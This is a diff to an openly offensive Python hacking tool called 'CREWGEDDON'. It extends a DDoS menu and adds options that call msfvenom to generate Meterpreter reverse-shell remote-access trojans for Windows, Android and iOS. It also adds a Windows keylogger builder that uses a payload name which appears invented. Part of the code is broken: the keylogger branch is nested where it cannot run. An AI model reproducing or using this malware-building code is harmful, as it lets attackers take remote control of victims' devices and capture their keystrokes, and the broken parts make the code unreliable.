@@ -56,9 +56,11 @@ while True:
                   print(Fore.RED + "[CREWGEDDON]: Could not retrieve IP address.")
       elif select == "3":
             print(Fore.RED + "[CREWGEDDON]: Welcome to the DDoS Attack") 
+            print(Fore.GREEN + "[0]" + Fore.BLUE + " - Back to Main Menu")
             print(Fore.GREEN + "[1]" + Fore.BLUE + " - Web Sites Attack")
             ddos_select = int(input(Fore.RED + "CREWGEDDON-DDOS~#: "))
-
+            if ddos_select == 0:
+                continue
             if ddos_select == 1:
                   ip = input(Fore.BLUE + "[CREWGEDDON-DDOS]: Enter IP Adress: ")
                   port = int(input(Fore.BLUE + "[CREWGEDDON-DDOS]: Enter Port: "))
@@ -126,7 +128,50 @@ while True:
                 print(Fore.BLUE + "[CREWGEDDON-SubDomain]: Subdomains found:")
                 for sub in sorted(subs):
                     print(Fore.GREEN + f"[CREWGEDDON-SubDomain]: {sub}")
+                    
+      elif select == "6":
+        print(Fore.RED + "[CREWGEDDON]: Welcome to RAT Tools")
+        print(Fore.GREEN + "[0]" + Fore.BLUE + " - Back to Main Menu")
+        print(Fore.GREEN + "[1]" + Fore.BLUE + " - Desktop RAT")
+        print(Fore.GREEN + "[2]" + Fore.BLUE + " - Android RAT")
+        print(Fore.GREEN + "[3]" + Fore.BLUE + " - IOS RAT")
+        rat_select = int(input(Fore.CYAN + "CREWGEDDON-RAT~#: "))
 
+        if rat_select == 0:
+            continue
+        elif rat_select == 1:
+            ip_adress = input(Fore.BLUE + "[CREWGEDDON-DesktopRAT]: Enter LOCAL IP: ")
+            port = int(input(Fore.BLUE + "[CREWGEDDON-DesktopRAT]: Enter LOCAL PORT: "))
+            exe_name = input(Fore.BLUE + "[CREWGEDDON-DesktopRAT]: Enter EXE NAME: ")
+            os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip_adress} LPORT={port} -f exe > {exe_name}.exe")
+            print(Fore.GREEN + f"[CREWGEDDON-DesktopRAT]: {exe_name}.exe created successfully. Location: root/{exe_name}.exe")
+        elif rat_select == 2:
+            ip_adress = input(Fore.BLUE + "[CREWGEDDON-AndroidRAT]: Enter LOCAL IP: ")
+            port = int(input(Fore.BLUE + "[CREWGEDDON-AndroidRAT]: Enter LOCAL PORT: "))
+            apk_name = input(Fore.BLUE + "[CREWGEDDON-AndroidRAT]: Enter APK NAME: ")
+            os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip_adress} LPORT={port} -f apk > {apk_name}.apk")
+            print(Fore.GREEN + f"[CREWGEDDON-AndroidRAT]: {apk_name}.apk created successfully. Location: root/{apk_name}.apk")
+        elif rat_select == 3:
+            ip_adress = input(Fore.BLUE + "[CREWGEDDON-iOSRAT]: Enter LOCAL IP: ")
+            port = int(input(Fore.BLUE + "[CREWGEDDON-iOSRAT]: Enter LOCAL PORT: "))
+            app_name = input(Fore.BLUE + "[CREWGEDDON-iOSRAT]: Enter APP NAME: ")
+            os.system(f"msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST={ip_adress} LPORT={port} -f macho > {app_name}.macho")
+            print(Fore.GREEN + f"[CREWGEDDON-iOSRAT]: {app_name}.macho created successfully. Location: root/{app_name}.macho")
+        
+        elif select == "7":
+            print(Fore.RED + "[CREWGEDDON]: Welcome to KeyLogger Tools")
+            print(Fore.GREEN + "[0]" + Fore.BLUE + " - Back to Main Menu")
+            print(Fore.GREEN + "[1]" + Fore.BLUE + " - Create KeyLogger")
+            keylogger_select = int(input(Fore.CYAN + "CREWGEDDON-KeyLogger~#: "))
+
+            if keylogger_select == 0:
+                continue
+            elif keylogger_select == 1:
+                ip_adress = input(Fore.BLUE + "[CREWGEDDON-KeyLogger]: Enter LOCAL IP: ")
+                port = int(input(Fore.BLUE + "[CREWGEDDON-KeyLogger]: Enter LOCAL PORT: "))
+                exe_name = input(Fore.BLUE + "[CREWGEDDON-KeyLogger]: Enter EXE NAME: ")
+                os.system(f"msfvenom -p windows/x64/keylogger/reverse_tcp LHOST={ip_adress} LPORT={port} -f exe > {exe_name}.exe")
+                print(Fore.GREEN + f"[CREWGEDDON-KeyLogger]: {exe_name}.exe created successfully. Location: root/{exe_name}.exe")
       elif select == "11":
             print(Fore.RED + "[CREWGEDDON]: Exiting...")
             os.system("exit")
@@ -135,3 +180,5 @@ while True:
             print(Fore.RED + "[CREWGEDDON]: Invalid option selected.")
 
 # Developed By: Crew
+# Since I've shared the project as open source and the development process is ongoing, there are some shortcomings. You can write your own updates or follow the updates.
+# Projeyi açık kaynak olarak paylaştığım için ve geliştirme süreci devam ettiği için eksikler mevcuttur. Sizler kendiniz yazabilir veya güncellemeleri takip edebilirsiniz.
